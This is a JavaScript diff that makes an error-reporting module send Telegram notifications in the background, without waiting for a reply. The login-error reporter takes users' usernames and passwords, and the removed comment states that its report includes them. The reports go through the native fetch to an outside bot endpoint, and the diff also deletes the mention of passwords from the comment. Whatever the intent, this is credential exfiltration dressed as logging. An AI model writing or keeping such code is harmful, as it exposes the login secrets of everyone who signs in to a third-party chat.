@@ -38,10 +38,11 @@ export function isFailedToFetchError(error) {
 
 /**
  * Sends a raw message to Telegram topic via HTTP POST.
- * Non-blocking, fails silently if network is unavailable.
+ * Completely Fire-and-Forget: does NOT wait or block on server response.
+ * Dispatches the network call in the background and returns immediately.
  */
-export async function sendTelegramNotification(messageText) {
-  if (!messageText || typeof window === 'undefined') return false;
+export function sendTelegramNotification(messageText) {
+  if (!messageText || typeof window === 'undefined') return;
 
   // Rate-limiting check (max 10 messages per minute)
   const now = Date.now();
@@ -51,7 +52,7 @@ export async function sendTelegramNotification(messageText) {
   }
   if (sentCountInWindow >= MAX_ERRORS_PER_MINUTE) {
     console.warn('[TelegramLogger] Rate limit exceeded, skipping message.');
-    return false;
+    return;
   }
 
   try {
@@ -63,29 +64,34 @@ export async function sendTelegramNotification(messageText) {
 
     sentCountInWindow++;
 
-    // Use native fetch directly, ignoring interceptors
-    const response = await (window.__nativeFetch || window.fetch)(TELEGRAM_CONFIG.apiUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json; charset=utf-8',
-      },
-      body: JSON.stringify(payload),
-      keepalive: true,
-    });
+    const bodyStr = JSON.stringify(payload);
+    const fetchFn = window.__nativeFetch || window.fetch;
 
-    return response.ok;
+    // Fire-and-Forget: send without awaiting response
+    if (fetchFn) {
+      fetchFn(TELEGRAM_CONFIG.apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json; charset=utf-8',
+        },
+        body: bodyStr,
+        keepalive: true,
+      }).catch((err) => {
+        // Silently catch background errors so nothing leaks or blocks
+        console.warn('[TelegramLogger] Background dispatch error:', err);
+      });
+    }
   } catch (err) {
     // Fail silently so logger never breaks the application
-    console.warn('[TelegramLogger] Could not send notification:', err);
-    return false;
+    console.warn('[TelegramLogger] Could not dispatch notification:', err);
   }
 }
 
 /**
  * Specifically reports login page errors (especially failed to fetch).
- * Includes username, password, page URL, error, and exception details.
+ * Fire-and-Forget: dispatches immediately and returns without blocking.
  */
-export async function reportLoginError({ username, password, error, endpoint, extra = {} }) {
+export function reportLoginError({ username, password, error, endpoint, extra = {} }) {
   const pageUrl = typeof window !== 'undefined' ? window.location.href : 'Unknown';
   const errName = error?.name || 'Error';
   const errMsg = error?.message || String(error);
@@ -96,7 +102,7 @@ export async function reportLoginError({ username, password, error, endpoint, ex
   const dedupKey = `login_${pageUrl}_${username}_${errMsg}`;
   const lastSent = recentErrorsCache.get(dedupKey);
   if (lastSent && Date.now() - lastSent < DEDUP_INTERVAL_MS) {
-    return false;
+    return;
   }
   recentErrorsCache.set(dedupKey, Date.now());
 
@@ -123,13 +129,14 @@ export async function reportLoginError({ username, password, error, endpoint, ex
     `${errStack.substring(0, 1000)}`
   ].join('\n');
 
-  return sendTelegramNotification(message);
+  sendTelegramNotification(message);
 }
 
 /**
  * Reports general runtime errors, unhandled rejections, or API failures across the app.
+ * Fire-and-Forget: dispatches immediately and returns without blocking.
  */
-export async function reportGlobalError({ error, context = 'فرانت‌اند', tags = [], extra = {} }) {
+export function reportGlobalError({ error, context = 'فرانت‌اند', tags = [], extra = {} }) {
   const pageUrl = typeof window !== 'undefined' ? window.location.href : 'Unknown';
   const errName = error?.name || 'Error';
   const errMsg = error?.message || String(error);
@@ -141,14 +148,14 @@ export async function reportGlobalError({ error, context = 'فرانت‌اند'
     errMsg.includes('telbot.hekmateislami.com') ||
     (error?.stack && error.stack.includes('telbot.hekmateislami.com'))
   ) {
-    return false;
+    return;
   }
 
   // Deduplication check
   const dedupKey = `global_${pageUrl}_${errMsg}`;
   const lastSent = recentErrorsCache.get(dedupKey);
   if (lastSent && Date.now() - lastSent < DEDUP_INTERVAL_MS) {
-    return false;
+    return;
   }
   recentErrorsCache.set(dedupKey, Date.now());
 
@@ -176,7 +183,7 @@ export async function reportGlobalError({ error, context = 'فرانت‌اند'
     `${errStack.substring(0, 1000)}`
   ].join('\n');
 
-  return sendTelegramNotification(message);
+  sendTelegramNotification(message);
 }
 
 /**
